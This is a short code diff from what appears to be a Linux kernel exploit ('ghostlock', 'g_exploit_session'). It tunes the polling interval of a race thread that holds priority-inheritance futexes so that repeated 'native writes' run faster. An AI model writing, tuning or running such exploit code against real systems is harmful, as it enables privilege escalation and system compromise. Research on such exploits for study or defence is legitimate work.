@@ -89,7 +89,10 @@ namespace ghostlock::race {
         race->owner_started.store(1);
         support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
         race->owner_chain_done.store(1);
-        while (!race->owner_stop.load()) sleep(1);
+        /* Poll the stop at the profile's interval: the join waits out this loop,
+         * and sleep(1) put up to ~1 s on every native write. */
+        while (!race->owner_stop.load())
+            usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
         if (lock_target == 0)
             support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
         return nullptr;
